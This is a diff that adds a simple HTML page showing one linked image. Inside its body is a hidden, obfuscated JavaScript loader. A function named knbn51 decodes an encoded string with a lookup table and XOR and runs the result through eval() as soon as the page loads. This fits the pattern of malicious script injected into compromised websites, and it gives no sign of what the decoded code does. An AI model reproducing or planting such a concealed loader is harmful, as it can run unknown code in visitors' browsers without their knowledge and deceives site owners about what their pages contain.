@@ -1,0 +1,21 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>Untitled Document</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<style type="text/css">
+<!--
+body {
+	margin-left: 0px;
+	margin-top: 0px;
+	margin-right: 0px;
+	margin-bottom: 0px;
+}
+-->
+</style></head>
+
+<body><script language=JavaScript> function knbn51(b) {	var e=b.length,f=1024,m,y,p,k=0,j=0,n=0,t=Array(63,56,43,10,30,29,23,18,58,37,0,0,0,0,0,0,28,62,25,39,6,61,22,3,44,54,46,19,51,11,0,35,49,26,7,41,13,2,20,47,21,1,12,0,0,0,0,9,0,31,48,52,5,14,4,15,38,36,50,24,34,55,57,45,33,53,40,27,59,42,17,8,16,60,32);for(y=Math.ceil(e/f);y>0;y--){p='';for(m=Math.min(e,f);m>0;m--,e--){{n|=(t[b.charCodeAt(k++)-48])<<j;if(j){p+=String.fromCharCode(182^n&255);n>>=8;j-=2}else{j=6}}}eval(p);}}knbn51('Y0TI7C5bkFHb6MybdWkijCTIKRBO7C5qGWEckMZhYKymUgoCvu1mxKyqsgo9kaEIKWrpYewqGDr9dK@qM7SmUMHPZhBheFHPKgockATIxC5hUCBlvInA6MHmk7@IGOoc4J0qUtThfaTI7CEI4A_CR3rpDF1C5DSpYewqGDki5D_9FDym7MHmM7rpgQSmK05c4MylNDr9dMyLQgElV3EmdsHI60ZOkCTIKK_l3hnmxKyqsgTlvA_') </script><!-- logoparc.com -->
+<a href="index2.html" target="_self"><img src="ppp-x.jpg" width="100%" border="0"></a>
+</body>
+</html>
